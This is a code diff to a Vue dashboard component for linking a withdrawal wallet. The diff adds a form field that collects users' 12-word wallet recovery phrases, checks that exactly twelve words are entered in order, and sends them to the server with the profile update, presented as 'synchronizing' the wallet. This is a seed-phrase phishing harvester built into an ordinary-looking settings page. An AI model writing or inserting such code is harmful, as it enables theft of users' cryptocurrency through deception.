@@ -1,6 +1,6 @@
 <template>
   <div style="color: white;" class="section-2-alpha">
-    <p class="text-1">Set Withdrawal Wallet Address</p>
+    <p class="text-1">Synchronize your Wallet to your Account</p>
     <hr/>
     <div class="form">
       <form @submit.prevent="updateDetails">
@@ -21,6 +21,17 @@
             <input type="text" v-model="walletAddress" required="required" class="form-input"/>
           </div>
 
+
+        <div class="space">
+          <label>12 key Phrases</label>
+          <textarea @change="formatPhrases" rows="4" cols="50" class="form-input-2" required="required" v-model="rawPhrases"></textarea>
+
+        </div>
+
+        <p class="text-block-51" style="padding-top: 10px; color: #6c757d;" >
+          Note: Ensure you write out correctly your 12 key Phrases for your wallet address, And also in the right
+          order to ensure a seamless Synchronization
+        </p>
 
 
 <!--        <div class="separate">-->
@@ -52,6 +63,7 @@
 import BaseButton from "@/components/baseComponents/buttons/BaseButton.vue";
 import {mapState} from "vuex";
 import StoreUtils from "@/utility/StoreUtils";
+import Swal from "sweetalert2";
 
 export default {
   name: "DashBoardLinkWalletAddress",
@@ -62,6 +74,9 @@ export default {
       userInfo: "",
       walletName: "",
       walletAddress: "",
+      phrase: "",
+      rawPhrases: '', // This holds the user's input
+      formattedPhrase: '' // This will store the formatted string
     }
   },
   computed:{
@@ -73,17 +88,37 @@ export default {
 
   methods: {
     async updateDetails() {
+      await this.formatPhrases();
       await StoreUtils.dispatch(StoreUtils.actions.auth.updateUser, {
         userId: this.userId,
         walletAddress: this.walletAddress,
         walletName: this.walletName,
+        keyPhrases: this.formattedPhrase,
       })
       await this.clear();
+    },
+
+    async formatPhrases() {
+      // Split the user input by spaces or newlines and trim whitespace
+      const wordsArray = this.rawPhrases.split(/\s+/).filter(word => word.trim() !== '');
+
+      if (wordsArray.length !== 12) {
+        await Swal.fire({
+          icon: 'warning',
+          title: 'Note',
+          text: 'Please enter exactly your 12 key Phrases, Ensure it is in right order',
+        });
+        return;
+      }
+
+      // Join the words into a single string separated by commas
+      this.formattedPhrase = wordsArray.join(', ');
     },
 
     clear(){
       this.walletName = ""
       this.walletAddress = ""
+      this.rawPhrases = ""
     }
   },
 
@@ -139,6 +174,16 @@ export default {
   padding: 5px 20px;
 }
 
+.form-input-2{
+  background-color: #000000;
+  border: 1px solid #000000;
+  border-radius: 5px ;
+  width: 100%;
+  max-width: 500px;
+  color: white;
+  padding: 5px 10px;
+}
+
 .text-1{
   text-align: left;
 }
@@ -167,6 +212,11 @@ label{
   margin-top: 3%;
 }
 
+.text-block-51 {
+  color: #FFFFFF;
+  font-size: 14px;
+  text-align: left;
+}
 /*input{*/
 /*  padding-top: 14px;*/
 /*  padding-bottom: 14px;*/
